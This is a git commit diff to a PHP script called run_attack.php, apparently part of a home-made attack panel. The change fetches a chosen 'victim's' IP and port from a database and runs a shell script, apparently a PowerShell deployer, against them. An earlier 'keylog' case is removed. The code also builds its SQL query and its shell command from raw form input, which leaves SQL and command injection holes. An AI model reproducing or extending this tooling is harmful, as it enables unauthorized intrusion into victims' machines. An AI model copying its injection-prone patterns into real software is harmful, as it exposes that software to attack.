6ed148928a30cc58d733e2f74da94ae2024fa72f
notReallyMe-R <crouch_person_0r@icloud.com>
2022-08-16 14:40:53 +0100

    gets IP and Port for the chosen victim

--- run_attack.php
+++ run_attack.php
@@ -1,15 +1,24 @@
 <html>
 <pre>
 <?php
+require 'connect.php';
 
-switch ($_POST['attack']){
-    case "keylog":
-        echo(shell_exec('ls'));
-        break;
-    default:
-        throw new \Exception('Unexpected value');
+$user = $_POST['userName'];
+$sql = "SELECT CurrentIP, CurrentPort FROM victim WHERE UserName='".$user."'";
+$result = $conn->query($sql);
+if ($result->num_rows > 0) {
+    echo "found rez";
+    // output data of each row
+    while($row = $result->fetch_assoc()) {
+        //gets the ip and port for the selected user
+        $ip = $row['CurrentIP'];
+        $port = $row['CurrentPort'];
+    }
+}else{
+    echo "0 reuslts";
 }
 
+echo(shell_exec("./deployPwsh.sh ".$_POST['attack']." ".$ip." ".$port));
 ?>
 </pre>
 </html>
